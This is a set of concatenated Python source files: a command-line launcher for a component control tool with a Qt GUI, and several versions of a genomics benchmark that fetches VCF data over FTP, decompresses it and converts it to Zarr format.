    subparser_editor = subparsers.add_parser('edit', help="Launches the editor to edit or create new systems and "
                                                          "components")
    # Create parser for the run command
    subparser_run = subparsers.add_parser('run', help="Launches the setup specified by the --config argument")
    # Create parser for validator
    subparser_val = subparsers.add_parser('validate', help="Validate the setup specified by the --config argument")

    subparser_remote = subparsers.add_parser('slave', help="Run a component locally without controlling it. The "
                                                           "control is taken care of the remote master invoking "
                                                           "this command.\nIf run with the --kill flag, the "
                                                           "passed component will be killed")

    subparser_val.add_argument("--visual", help="Generate and show a graph image", action="store_true")

    remote_mutex = subparser_remote.add_mutually_exclusive_group(required=False)

    remote_mutex.add_argument('-k', '--kill', help="switch to kill mode", action="store_true")
    remote_mutex.add_argument('-c', '--check', help="Run a component check", action="store_true")

    args = parser.parse_args()
    logger.debug(args)

    if args.cmd == 'edit':
        logger.debug("Launching editor mode")

    elif args.cmd == 'run':
        logger.debug("Launching runner mode")

        cc = ControlCenter(args.config)
        cc.init()
        start_gui(cc)

    elif args.cmd == 'validate':
        logger.debug("Launching validation mode")
        cc = ControlCenter(args.config)
        if args.visual:
            cc.set_dependencies(False)
            cc.draw_graph()
        else:
            cc.set_dependencies(True)

    elif args.cmd == 'slave':
        logger.debug("Launching slave mode")
        sl = SlaveLauncher(args.config, args.kill, args.check)

        if args.check:
            sl.run_check()
        else:
            sl.init()


###################
# GUI
###################
def start_gui(control_center):
    app = QtGui.QApplication(sys.argv)
    main_window = QtGui.QMainWindow()
    ui = hyperGUI.UiMainWindow()
    ui.ui_init(main_window, control_center)
    main_window.show()
    sys.exit(app.exec_())

""" Main module for the benchmark. It reads the command line arguments, reads the benchmark configuration, 
determines the runtime mode (dynamic vs. static); if dynamic, gets the benchmark data from the server,
runs the benchmarks, and records the timer results. """

import argparse  # for command line parsing
import time  # for benchmark timer
import csv  # for writing results
import logging
import sys
import shutil
from benchmark import config, data_service                    


def get_cli_arguments():
    """ Returns command line arguments. 

    Returns:
    args object from an ArgumentParses for fetch data (boolean, from a server), label (optional, for naming the benchmark run), 
    and config argument for where is the config file. """

    logging.debug('Getting cli arguments')

    parser = argparse.ArgumentParser(description="A benchmark for genomics routines in Python.")

    # Enable three exclusive groups of options (using subparsers)
    # https://stackoverflow.com/questions/17909294/python-argparse-mutual-exclusive-group/17909525

    subparser = parser.add_subparsers(title="commands", dest="command")
    subparser.required = True

    config_parser = subparser.add_parser("config",
                                         help='Setting up the default configuration of the benchmark. It creates the default configuration file.')
    config_parser.add_argument("--output_config", type=str, required=True,
                               help="Specify the output path to a configuration file.", metavar="FILEPATH")
    config_parser.add_argument("-f", action="store_true", help="Overwrite the destination file if it already exists.")

    data_setup_parser = subparser.add_parser("setup",
                                             help='Preparation and setting up of the data for the benchmark. It requires a configuration file.')
    data_setup_parser.add_argument("--config_file", required=True, help="Location of the configuration file",
                                   metavar="FILEPATH")

    benchmark_exec_parser = subparser.add_parser("exec",
                                                 help='Execution of the benchmark modes. It requires a configuration file.')
    # TODO: use run_(timestamp) as default
    benchmark_exec_parser.add_argument("--label", type=str, default="run", metavar="RUN_LABEL",                    
                                       help="Label for the benchmark run.")
    benchmark_exec_parser.add_argument("--config_file", type=str, required=True,
                                       help="Specify the path to a configuration file.", metavar="FILEPATH")

    runtime_configuration = vars(parser.parse_args())
    return runtime_configuration


def _main():
    input_directory = "./data/input/"                    
    download_directory = input_directory + "download/"                    
    temp_directory = "./data/temp/"                    
    vcf_directory = "./data/vcf/"                    
    zarr_directory_setup = "./data/zarr/"                    
    zarr_directory_benchmark = "./data/zarr_benchmark/"                    

    cli_arguments = get_cli_arguments()

    command = cli_arguments["command"]
    if command == "config":
        output_config_location = cli_arguments["output_config"]
        overwrite_mode = cli_arguments["f"]
        config.generate_default_config_file(output_location=output_config_location,
                                            overwrite=overwrite_mode)
    elif command == "setup":
        print("[Setup] Setting up benchmark data.")

        # Clear out existing files in VCF and Zarr directories
        data_service.remove_directory_tree(vcf_directory)                    
        data_service.remove_directory_tree(zarr_directory_setup)                    

        # Get runtime config from specified location
        runtime_config = config.read_configuration(location=cli_arguments["config_file"])

        # Get FTP module settings from runtime config
        ftp_config = config.FTPConfigurationRepresentation(runtime_config)

        if ftp_config.enabled:
            print("[Setup][FTP] FTP module enabled. Running FTP download...")
            data_service.fetch_data_via_ftp(ftp_config=ftp_config, local_directory=download_directory)                    
        else:
            print("[Setup][FTP] FTP module disabled. Skipping FTP download...")

        # Process/Organize downloaded files
        data_service.process_data_files(input_dir=input_directory,                    
                                        temp_dir=temp_directory,                    
                                        output_dir=vcf_directory)                    

        # Convert VCF files to Zarr format if the module is enabled
        vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation(runtime_config)                    
        if vcf_to_zarr_config.enabled:
            data_service.setup_vcf_to_zarr(input_vcf_dir=vcf_directory,                    
                                           output_zarr_dir=zarr_directory_setup,                    
                                           conversion_config=vcf_to_zarr_config)
    elif command == "exec":
        print("[Exec] Executing benchmark tool.")

        # Get runtime config from specified location
        runtime_config = config.read_configuration(location=cli_arguments["config_file"])

        # Get VCF to Zarr conversion settings from runtime config
        vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation(runtime_config)                    

        # TODO: Convert necessary VCF files to Zarr format
        # data_service.convert_to_zarr("./data/vcf/chr22.1000.vcf", "./data/zarr/chr22.1000.zarr", vcf_to_zarr_config)
    else:
        print("Error: Unexpected command specified. Exiting...")
        sys.exit(1)


def main():
    try:
        _main()
    except KeyboardInterrupt:
        print("Program interrupted. Exiting...")
        sys.exit(1)

""" Main module for the benchmark. It reads the command line arguments, reads the benchmark configuration, 
determines the runtime mode (dynamic vs. static); if dynamic, gets the benchmark data from the server,
runs the benchmarks, and records the timer results. """

import time  # for benchmark timer
import csv  # for writing results
import logging


def run_benchmark(bench_conf):                    
    pass                    


def run_dynamic(ftp_location):                    
    pass                    


def run_static():                    
    pass                    


def get_remote_files(ftp_server, ftp_directory, files=None):                    
    pass                    


def record_runtime(benchmark, timestamp):                    
    pass                    


# temporary here
def main():                    
    pass                    

""" Main module for the benchmark. It reads the command line arguments, reads the benchmark configuration, 
determines the runtime mode (dynamic vs. static); if dynamic, gets the benchmark data from the server,
runs the benchmarks, and records the timer results. """

import urllib.request
from ftplib import FTP, FTP_TLS, error_perm
import time  # for benchmark timer
import csv  # for writing results
import logging
import os.path
import pathlib
import allel
import sys
import functools
import numpy as np
import zarr
import numcodecs
from numcodecs import Blosc, LZ4, LZMA                    
from benchmark import config                    

import gzip
import shutil


def create_directory_tree(path):
    """
    Creates directories for the path specified.
    :param path: The path to create dirs/subdirs for
    :type path: str
    """
    path = str(path)  # Ensure path is in str format
    pathlib.Path(path).mkdir(parents=True, exist_ok=True)


def remove_directory_tree(path):
    """
    Removes the directory and all subdirectories/files within the path specified.
    :param path: The path to the directory to remove
    :type path: str
    """

    if os.path.exists(path):
        shutil.rmtree(path, ignore_errors=True)


def fetch_data_via_ftp(ftp_config, local_directory):
    """ Get benchmarking data from a remote ftp server. 
    :type ftp_config: config.FTPConfigurationRepresentation
    :type local_directory: str
    """
    if ftp_config.enabled:
        # Create local directory tree if it does not exist
        create_directory_tree(local_directory)

        # Login to FTP server
        if ftp_config.use_tls:
            ftp = FTP_TLS(ftp_config.server)
            ftp.login(ftp_config.username, ftp_config.password)
            ftp.prot_p()  # Request secure data connection for file retrieval
        else:
            ftp = FTP(ftp_config.server)
            ftp.login(ftp_config.username, ftp_config.password)

        if not ftp_config.files:  # Auto-download all files in directory
            fetch_data_via_ftp_recursive(ftp=ftp,
                                         local_directory=local_directory,
                                         remote_directory=ftp_config.directory)
        else:
            ftp.cwd(ftp_config.directory)

            file_counter = 1
            file_list_total = len(ftp_config.files)

            for remote_filename in ftp_config.files:
                local_filename = remote_filename
                filepath = os.path.join(local_directory, local_filename)
                if not os.path.exists(filepath):
                    with open(filepath, "wb") as local_file:
                        try:
                            ftp.retrbinary('RETR %s' % remote_filename, local_file.write)
                            print("[Setup][FTP] ({}/{}) File downloaded: {}".format(file_counter, file_list_total,
                                                                                    filepath))
                        except error_perm:
                            # Error downloading file. Display error message and delete local file
                            print("[Setup][FTP] ({}/{}) Error downloading file. Skipping: {}".format(file_counter,
                                                                                                     file_list_total,
                                                                                                     filepath))
                            local_file.close()
                            os.remove(filepath)
                else:
                    print("[Setup][FTP] ({}/{}) File already exists. Skipping: {}".format(file_counter, file_list_total,
                                                                                          filepath))
                file_counter = file_counter + 1
        # Close FTP connection
        ftp.close()


def fetch_data_via_ftp_recursive(ftp, local_directory, remote_directory, remote_subdirs_list=None):
    """
    Recursive function that automatically downloads all files with a FTP directory, including subdirectories.
    :type ftp: ftplib.FTP
    :type local_directory: str
    :type remote_directory: str
    :type remote_subdirs_list: list
    """

    if (remote_subdirs_list is not None) and (len(remote_subdirs_list) > 0):
        remote_path_relative = "/".join(remote_subdirs_list)
        remote_path_absolute = "/" + remote_directory + "/" + remote_path_relative + "/"
    else:
        remote_subdirs_list = []
        remote_path_relative = ""
        remote_path_absolute = "/" + remote_directory + "/"

    try:
        local_path = local_directory + "/" + remote_path_relative
        os.mkdir(local_path)
        print("[Setup][FTP] Created local folder: {}".format(local_path))
    except OSError:  # Folder already exists at destination. Do nothing.
        pass
    except error_perm:  # Invalid Entry
        print("[Setup][FTP] Error: Could not change to: {}".format(remote_path_absolute))

    ftp.cwd(remote_path_absolute)

    # Get list of remote files/folders in current directory
    file_list = ftp.nlst()

    file_counter = 1
    file_list_total = len(file_list)

    for file in file_list:
        file_path_local = local_directory + "/" + remote_path_relative + "/" + file
        if not os.path.isfile(file_path_local):
            try:
                # Determine if a file or folder
                ftp.cwd(remote_path_absolute + file)
                # Path is for a folder. Run recursive function in new folder
                print("[Setup][FTP] Switching to directory: {}".format(remote_path_relative + "/" + file))
                new_remote_subdirs_list = remote_subdirs_list.copy()
                new_remote_subdirs_list.append(file)
                fetch_data_via_ftp_recursive(ftp=ftp, local_directory=local_directory,
                                             remote_directory=remote_directory,
                                             remote_subdirs_list=new_remote_subdirs_list)
                # Return up one level since we are using recursion
                ftp.cwd(remote_path_absolute)
            except error_perm:
                # file is an actual file. Download if it doesn't already exist on filesystem.
                temp = ftp.nlst()
                if not os.path.isfile(file_path_local):
                    with open(file_path_local, "wb") as local_file:
                        ftp.retrbinary('RETR {}'.format(file), local_file.write)
                    print("[Setup][FTP] ({}/{}) File downloaded: {}".format(file_counter, file_list_total,
                                                                            file_path_local))
        else:
            print("[Setup][FTP] ({}/{}) File already exists. Skipping: {}".format(file_counter, file_list_total,
                                                                                  file_path_local))
        file_counter = file_counter + 1


def fetch_file_from_url(url, local_file):
    urllib.request.urlretrieve(url, local_file)


def decompress_gzip(local_file_gz, local_file):
    with open(local_file, 'wb') as file_out, gzip.open(local_file_gz, 'rb') as file_in:
        shutil.copyfileobj(file_in, file_out)


def process_data_files(input_dir, temp_dir, output_dir):
    """
    Iterates through all files in input_dir and processes *.vcf.gz files to *.vcf, placed in output_dir.
    Additionally moves *.vcf files to output_dir
    Note: This method searches through all subdirectories within input_dir, and files are placed in root of output_dir.
    :param input_dir: The input directory containing files to process
    :param temp_dir: The temporary directory for unzipping *.gz files, etc.
    :param output_dir: The output directory where processed *.vcf files should go
    :type input_dir: str
    :type temp_dir: str
    :type output_dir: str
    """

    # Ensure input, temp, and output directory paths are in str format, not pathlib
    input_dir = str(input_dir)
    temp_dir = str(temp_dir)
    output_dir = str(output_dir)

    # Create input, temp, and output directories if they do not exist
    create_directory_tree(input_dir)
    create_directory_tree(temp_dir)
    create_directory_tree(output_dir)

    # Iterate through all *.gz files in input directory and uncompress them to the temporary directory
    pathlist_gz = pathlib.Path(input_dir).glob("**/*.gz")
    for path in pathlist_gz:
        path_str = str(path)
        file_output_str = path_leaf(path_str)
        file_output_str = file_output_str[0:len(file_output_str) - 3]  # Truncate *.gz from input filename
        path_temp_output = str(pathlib.Path(temp_dir, file_output_str))
        print("[Setup][Data] Decompressing file: {}".format(path_str))
        print("  - Output: {}".format(path_temp_output))

        # Decompress the .gz file
        decompress_gzip(path_str, path_temp_output)

    # Iterate through all files in temporary directory and move *.vcf files to output directory
    pathlist_vcf_temp = pathlib.Path(temp_dir).glob("**/*.vcf")
    for path in pathlist_vcf_temp:
        path_temp_str = str(path)
        filename_str = path_leaf(path_temp_str)  # Strip filename from path
        path_vcf_str = str(pathlib.Path(output_dir, filename_str))

        shutil.move(path_temp_str, path_vcf_str)

    # Remove temporary directory
    remove_directory_tree(temp_dir)

    # Copy any *.vcf files already in input directory to the output directory
    pathlist_vcf_input = pathlib.Path(input_dir).glob("**/*.vcf")
    for path in pathlist_vcf_input:
        path_input_str = str(path)
        filename_str = path_leaf(path_input_str)  # Strip filename from path
        path_vcf_str = str(pathlib.Path(output_dir, filename_str))

        shutil.copy(path_input_str, path_vcf_str)


def path_head(path):
    head, tail = os.path.split(path)
    return head


def path_leaf(path):
    head, tail = os.path.split(path)
    return tail or os.path.basename(head)


def read_file_contents(local_filepath):
    if os.path.isfile(local_filepath):
        with open(local_filepath) as f:
            data = f.read()
            return data
    else:
        return None


def setup_vcf_to_zarr(input_vcf_dir, output_zarr_dir, conversion_config):
    """
    Converts all VCF files in input directory to Zarr format, placed in output directory,
    based on conversion configuration parameters
    :param input_vcf_dir: The input directory where VCF files are located
    :param output_zarr_dir: The output directory to place Zarr-formatted data
    :param conversion_config: Configuration data for the conversion
    :type input_vcf_dir: str
    :type output_zarr_dir: str
    :type conversion_config: config.VCFtoZarrConfigurationRepresentation
    """
    # Ensure input and output directory paths are in str format, not pathlib
    input_vcf_dir = str(input_vcf_dir)
    output_zarr_dir = str(output_zarr_dir)

    # Create input and output directories if they do not exist
    create_directory_tree(input_vcf_dir)
    create_directory_tree(output_zarr_dir)

    # Iterate through all *.vcf files in input directory and convert to Zarr format
    pathlist_vcf = pathlib.Path(input_vcf_dir).glob("**/*.vcf")
    for path in pathlist_vcf:
        path_str = str(path)
        file_output_str = path_leaf(path_str)
        file_output_str = file_output_str[0:len(file_output_str) - 4]  # Truncate *.vcf from input filename
        path_zarr_output = str(pathlib.Path(output_zarr_dir, file_output_str))
        print("[Setup][Data] Converting VCF file to Zarr format: {}".format(path_str))
        print("  - Output: {}".format(path_zarr_output))

        # Convert to Zarr format
        convert_to_zarr(input_vcf_path=path_str,
                        output_zarr_path=path_zarr_output,
                        conversion_config=conversion_config)


def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config):                    
    """ Converts the original data (VCF) to a Zarr format. Only converts a single VCF file.
    :param input_vcf_path: The input VCF file location
    :param output_zarr_path: The desired Zarr output location
    :param conversion_config: Configuration data for the conversion
    :type input_vcf_path: str
    :type output_zarr_path: str
    :type conversion_config: config.VCFtoZarrConfigurationRepresentation
    """
    if conversion_config is not None:
        # Ensure var is string, not pathlib.Path
        output_zarr_path = str(output_zarr_path)

        # Get alt number
        if conversion_config.alt_number is None:
            print("[VCF-Zarr] Determining maximum number of ALT alleles by scaling all variants in the VCF file.")
            # Scan VCF file to find max number of alleles in any variant
            callset = allel.read_vcf(input_vcf_path, fields=['numalt'], log=sys.stdout)
            numalt = callset['variants/numalt']
            alt_number = np.max(numalt)
        else:
            print("[VCF-Zarr] Using alt number provided in configuration.")
            # Use the configuration-provided alt number
            alt_number = conversion_config.alt_number
        print("[VCF-Zarr] Alt number: {}".format(alt_number))

        # Get chunk length
        chunk_length = allel.vcf_read.DEFAULT_CHUNK_LENGTH
        if conversion_config.chunk_length is not None:
            chunk_length = conversion_config.chunk_length
        print("[VCF-Zarr] Chunk length: {}".format(chunk_length))

        # Get chunk width
        chunk_width = allel.vcf_read.DEFAULT_CHUNK_WIDTH
        if conversion_config.chunk_width is not None:
            chunk_width = conversion_config.chunk_width
        print("[VCF-Zarr] Chunk width: {}".format(chunk_width))

        if conversion_config.compressor == "Blosc":
            compressor = Blosc(cname=conversion_config.blosc_compression_algorithm,
                               clevel=conversion_config.blosc_compression_level,
                               shuffle=conversion_config.blosc_shuffle_mode)
        else:
            raise ValueError("Unexpected compressor type specified.")

        print("[VCF-Zarr] Using {} compressor.".format(conversion_config.compressor))                    

        print("[VCF-Zarr] Performing VCF to Zarr conversion...")                    
        # Perform the VCF to Zarr conversion
        allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True,                    
                          log=sys.stdout, compressor=compressor, chunk_length=chunk_length, chunk_width=chunk_width)
        print("[VCF-Zarr] Done.")                    

